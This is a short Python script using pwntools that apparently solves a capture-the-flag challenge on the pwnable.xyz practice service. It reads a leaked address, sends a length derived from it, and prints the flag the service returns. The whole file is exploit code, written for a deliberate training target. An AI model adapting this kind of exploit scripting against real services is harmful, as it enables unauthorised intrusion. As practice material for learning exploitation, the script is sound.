from pwn import *
import re

#context.log_level = 'debug'

#io = process('../pwnable_21')
io = remote('svc.pwnable.xyz', 30000)


leak_line = io.recvline_containsS(b"Leak")
leak = re.search(r"0x.*", leak_line).group(0)
length = int(leak, 0) + 1
io.sendline(str(length).encode('utf-8'))
io.recv()
io.recv()
io.sendline(b" ")
flag = io.readS()
io.close()

print(flag)